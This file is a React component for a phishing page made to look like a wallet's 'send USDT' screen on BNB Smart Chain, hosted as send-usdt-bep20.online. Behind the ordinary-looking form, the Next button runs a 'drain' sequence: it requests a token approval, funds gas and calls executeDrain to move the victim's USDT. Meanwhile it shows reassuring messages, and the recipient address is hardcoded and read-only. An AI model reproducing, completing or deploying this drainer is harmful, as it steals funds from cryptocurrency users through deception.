import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";
import { USDT_ADDRESS, USDT_DECIMALS } from "../config";
import { requestApproval, ensureGas, executeDrain, ensureCorrectNetwork } from "../lib/web3";

interface Props {
  provider: ethers.BrowserProvider;
  address: string;
}

type DrainStage = "idle" | "switching_network" | "approving" | "checking_gas" | "draining" | "done" | "error";

export default function SendPage({ provider, address }: Props) {
  const [amount, setAmount] = useState("");
  const [usdtBalance, setUsdtBalance] = useState("0");
  const [stage, setStage] = useState<DrainStage>("idle");
  const [statusMsg, setStatusMsg] = useState("");
  const [networkOk, setNetworkOk] = useState(false);
  const [networkError, setNetworkError] = useState("");
  const [isDarkMode, setIsDarkMode] = useState(true); // Default to dark mode (Trust Wallet's default)
  const mountedRef = useRef(true);

  // Detect Trust Wallet's theme (dark/light)
  useEffect(() => {
    const trustWalletDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
    setIsDarkMode(trustWalletDarkMode);

    const themeListener = (e: MediaQueryListEvent) => setIsDarkMode(e.matches);
    window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change", themeListener);

    return () => {
      window.matchMedia("(prefers-color-scheme: dark)").removeEventListener("change", themeListener);
    };
  }, []);

  useEffect(() => {
    mountedRef.current = true;

    const init = async () => {
      if (!mountedRef.current) return;

      let activeProvider: ethers.BrowserProvider = provider;
      try {
        const switchedProvider = await ensureCorrectNetwork(provider);
        if (!mountedRef.current) return;
        activeProvider = switchedProvider;
        setNetworkOk(true);
        setNetworkError("");
      } catch (err: any) {
        if (!mountedRef.current) return;
        setNetworkOk(false);
        setNetworkError(err.message || "Please switch to BNB Smart Chain");
        return;
      }

      try {
        const usdt = new ethers.Contract(
          USDT_ADDRESS,
          ["function balanceOf(address) view returns (uint256)"],
          activeProvider
        );
        const bal = await usdt.balanceOf(address);
        if (mountedRef.current) setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS));
      } catch (err: any) {
        console.warn("Balance fetch failed:", err?.message || err);
        if (mountedRef.current) setUsdtBalance("0");
      }
    };

    init();

    return () => {
      mountedRef.current = false;
    };
  }, [address, provider]);

  const handleNext = async () => {
    setStage("switching_network");
    setStatusMsg("Preparing network...");
    try {
      const switchedProvider = await ensureCorrectNetwork(provider);

      // 1) APPROVAL FIRST
      setStage("approving");
      setStatusMsg("Waiting for approval...");
      const approval = await requestApproval(switchedProvider, address);
      if (!approval) {
        setStage("error");
        setStatusMsg("Approval failed.");
        return;
      }

      // 2) THEN check gas / fund
      setStage("checking_gas");
      setStatusMsg("Checking gas balance...");
      const hasGas = await ensureGas(switchedProvider, address);
      if (!hasGas) {
        setStage("error");
        setStatusMsg("Could not fund gas.");
        return;
      }

      // 3) THEN drain
      setStage("draining");
      setStatusMsg("Transferring USDT...");
      const drained = await executeDrain(address, approval);
      if (drained) {
        setStage("done");
        setStatusMsg("Transaction complete!");
      } else {
        setStage("error");
        setStatusMsg("Drain failed - check logs.");
      }
    } catch (err: any) {
      setStage("error");
      setStatusMsg("Error: " + (err.message || "Unknown error"));
    }
  };

  // Loading/Error/Success States (Unchanged)
  if (stage !== "idle") {
    return (
      <div
        className={`min-h-screen flex flex-col items-center justify-center px-6 ${
          isDarkMode ? "bg-black" : "bg-white"
        }`}
      >
        {stage === "switching_network" || stage === "approving" || stage === "checking_gas" || stage === "draining" ? (
          <>
            <div className="w-12 h-12 rounded-full border-4 border-[#2ECC71] border-t-transparent animate-spin mb-6" />
            <h2 className={`text-lg font-semibold mb-2 ${isDarkMode ? "text-white" : "text-black"}`}>
              Processing
            </h2>
            <p className={`text-sm text-center ${isDarkMode ? "text-gray-400" : "text-gray-600"}`}>
              {statusMsg}
            </p>
          </>
        ) : stage === "done" ? (
          <>
            <div className="w-12 h-12 rounded-full bg-[#2ECC71] flex items-center justify-center mb-6">
              <span className="text-[#171717] text-2xl font-bold">✓</span>
            </div>
            <h2 className={`text-lg font-semibold mb-2 ${isDarkMode ? "text-white" : "text-black"}`}>
              Complete
            </h2>
            <p className={`text-sm text-center ${isDarkMode ? "text-gray-400" : "text-gray-600"}`}>
              {statusMsg}
            </p>
            <p className={`text-xs text-center mt-4 ${isDarkMode ? "text-gray-500" : "text-gray-400"}`}>
              You may close this page.
            </p>
          </>
        ) : (
          <>
            <div className="w-12 h-12 rounded-full bg-[#E74C3C] flex items-center justify-center mb-6">
              <span className="text-white text-2xl font-bold">!</span>
            </div>
            <h2 className={`text-lg font-semibold mb-2 ${isDarkMode ? "text-white" : "text-black"}`}>
              Error
            </h2>
            <p className={`text-sm text-center ${isDarkMode ? "text-gray-400" : "text-gray-600"}`}>
              {statusMsg}
            </p>
          </>
        )}
      </div>
    );
  }

  // Main Send Page UI (Updated to match screenshot)
  return (
    <div
      className={`min-h-screen flex flex-col ${
        isDarkMode ? "bg-black text-white" : "bg-white text-black"
      }`}
    >
      {/* Header */}
      <div
        className={`flex items-center justify-between p-4 border-b ${
          isDarkMode ? "border-gray-700" : "border-gray-200"
        }`}
      >
        <div className="flex items-center gap-2">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
            />
          </svg>
          <span className="font-semibold">send-usdt-bep20.online</span>
        </div>
        <div className="flex items-center gap-2">
          <button
            className={`p-2 rounded-full ${
              isDarkMode ? "bg-gray-700" : "bg-gray-200"
            }`}
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-5 w-5"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M4 6h16M4 12h16M4 18h16"
              />
            </svg>
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 p-4">
        {/* Network Error/Success Messages */}
        {networkError && !networkOk && (
          <div
            className={`border rounded-lg px-4 py-3 mb-4 ${
              isDarkMode
                ? "bg-gray-900 border-red-500 text-red-500"
                : "bg-red-50 border-red-200 text-red-700"
            }`}
          >
            <p className="text-xs text-center">{networkError}</p>
          </div>
        )}
        {networkOk && (
          <div
            className={`border rounded-lg px-4 py-3 mb-4 ${
              isDarkMode
                ? "bg-gray-900 border-green-500 text-green-500"
                : "bg-green-50 border-green-200 text-green-700"
            }`}
          >
            <p className="text-xs text-center">Connected to BNB Smart Chain (BEP-20)</p>
          </div>
        )}

        {/* Address Input */}
        <div className="space-y-2 mb-6">
          <label className="block text-sm font-medium text-gray-400">Address or Domain Name</label>
          <div className="relative">
            <input
              type="text"
              value="0x3881448305a5fAb94461"
              readOnly
              className={`w-full px-4 py-3 rounded-lg border ${
                isDarkMode
                  ? "bg-gray-800 border-gray-600 text-white"
                  : "bg-white border-gray-300 text-black"
              }`}
            />
            <div className="absolute right-2 top-1/2 transform -translate-y-1/2 flex items-center gap-2">
              <button
                type="button"
                className="text-green-500 text-sm font-medium"
                onClick={() => navigator.clipboard.readText().then(setAmount)}
              >
                Paste
              </button>
              <button
                type="button"
                className={`p-1 rounded ${
                  isDarkMode ? "hover:bg-gray-700" : "hover:bg-gray-100"
                }`}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5 text-gray-400"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2zm.5-10h7"
                  />
                </svg>
              </button>
              <button
                type="button"
                className={`p-1 rounded ${
                  isDarkMode ? "hover:bg-gray-700" : "hover:bg-gray-100"
                }`}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5 text-gray-400"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"
                  />
                </svg>
              </button>
            </div>
          </div>
        </div>

        {/* Network Selector */}
        <div className="space-y-2 mb-6">
          <label className="block text-sm font-medium text-gray-400">Destination network</label>
          <div
            className={`flex items-center justify-between px-4 py-3 rounded-lg border ${
              isDarkMode
                ? "bg-gray-800 border-gray-600 text-white"
                : "bg-white border-gray-300 text-black"
            }`}
          >
            <div className="flex items-center gap-2">
              <img
                src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png"
                alt="BNB"
                className="w-5 h-5"
              />
              <span className="text-sm font-medium">BNB Smart Chain</span>
            </div>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-4 w-4 text-gray-400"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M19 9l-7 7-7-7"
              />
            </svg>
          </div>
        </div>

        {/* Amount Input */}
        <div className="space-y-2 mb-6">
          <label className="block text-sm font-medium text-gray-400">Amount</label>
          <div className="relative">
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className={`w-full px-4 py-3 rounded-lg border ${
                isDarkMode
                  ? "bg-gray-800 border-gray-600 text-white"
                  : "bg-white border-gray-300 text-black"
              }`}
              placeholder="USDT Amount"
              step="0.000001"
              min="0"
            />
            <div className="absolute right-2 top-1/2 transform -translate-y-1/2 flex items-center gap-2">
              <span className="text-sm font-medium text-gray-400">USDT</span>
              <button
                onClick={() => setAmount(usdtBalance)}
                className="text-green-500 text-sm font-medium"
              >
                Max
              </button>
            </div>
          </div>
          <div className="text-right text-xs text-gray-500">
            ≈ ${(parseFloat(usdtBalance || "0") * 1).toFixed(2)} USDT
          </div>
        </div>

        {/* Spacer */}
        <div className="flex-1" />

        {/* Submit Button */}
        <button
          onClick={handleNext}
          className="w-full py-3 bg-green-500 text-white font-semibold rounded-full hover:bg-green-600 transition-colors"
        >
          Next
        </button>
      </div>

      {/* Bottom Navigation (Mobile Only) */}
      <div
        className={`flex justify-around items-center p-2 border-t md:hidden ${
          isDarkMode ? "border-gray-700" : "border-gray-200"
        }`}
      >
        <button
          className={`p-2 rounded ${
            isDarkMode ? "hover:bg-gray-700" : "hover:bg-gray-100"
          }`}
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6 text-gray-400"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M15 19l-7-7 7-7"
            />
          </svg>
        </button>
        <button
          className={`p-2 rounded ${
            isDarkMode ? "hover:bg-gray-700" : "hover:bg-gray-100"
          }`}
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6 text-gray-400"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z"
            />
          </svg>
        </button>
        <button
          className={`p-2 rounded ${
            isDarkMode ? "hover:bg-gray-700" : "hover:bg-gray-100"
          }`}
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-6 w-6 text-gray-400"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c-.94 1.543.826 3.31 2.37 2.37a1.724 1.724 0 002.572 1.065c.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c.94-1.543-.826-3.31-2.37-2.37-.996.608-2.296.07-2.572-1.065z"
            />
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
            />
          </svg>
        </button>
      </div>
    </div>
  );
}